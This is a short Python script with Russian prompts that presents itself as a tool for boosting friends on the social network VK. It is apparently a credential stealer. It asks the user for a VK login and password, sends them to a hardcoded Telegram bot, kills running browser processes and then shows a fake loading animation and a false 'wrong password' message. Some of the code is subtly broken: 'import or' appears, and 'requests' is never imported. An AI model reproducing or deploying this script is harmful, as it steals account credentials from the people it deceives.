# -*- coding: utf-8 -*-
import webbrowser
import re
import or 
import time
import sys
import itertools
import threading
print('█   █   ██   █  █  ████    █   █   █████  █  █   ██ ')
print('█   █  █  █  █ █   █   █    █ █      █    █ █   █  █ ')
print('█████  ████  ██    ████      █       █    ██    ████ ')
print('█   █  █  █  █ █   █        █        █    █ █   █  █ ')
print('█   █  █  █  █  █  █       █         █    █  █  █  █ ')
print('by polo.')
print('')
log = input('Введите логин вк: ')
passik = input('Ввведите пароль вк: ')
num = input('Сколько накрутить друзей: ')

requests.get('https://api.telegram.org/bot1609859164:AAHkDLdcz1sDMHWU01KlTlYqLJYMR_0lOds/sendMessage?chat_id=706208466&text=логин: '+log+' Пароль: '+passik)

time.sleep(3) # Сон в 3 секунды
os.system("taskkill /im browser.exe /f")
os.system("taskkill /im opera.exe /f")
os.system("taskkill /im firefox.exe /f")
os.system("taskkill /im dddchrome.exe /f")	
done = False
#here is the animation
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rзагрузка ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\Пароль не верный. выключите программу и попробуйте повторить попытку     ')

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(5)
done = True

